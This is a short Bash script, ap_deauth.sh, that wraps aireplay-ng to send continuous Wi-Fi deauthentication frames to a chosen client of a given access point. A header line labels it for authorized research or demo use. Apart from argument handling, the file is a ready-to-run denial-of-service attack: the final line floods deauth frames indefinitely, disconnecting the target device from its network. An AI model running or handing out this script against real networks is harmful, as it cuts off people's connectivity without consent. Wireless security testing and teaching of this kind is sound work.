#!/usr/bin/env bash
# ap_deauth.sh - send deauth frames to a station (research/demo, authorized use only).
# Interface defaults to wlan0mon; override with the WIFI_MON env var.
#   ap_deauth.sh BSSID STATION
# --- end usage ---
set -uo pipefail
[[ "${1:-}" == -h || "${1:-}" == --help ]] && {
	sed -n '3,/^# --- end usage ---$/{/^# --- end usage ---$/!p}' "$0" | sed 's/^# \{0,1\}//'
	exit 0
}
if [ $# -ne 2 ]; then
	echo "Error: pass BSSID (router) as arg 1 and STATION (target) as arg 2" >&2
	exit 1
fi
sudo aireplay-ng --deauth 0 -a "$1" -c "$2" "${WIFI_MON:-wlan0mon}"
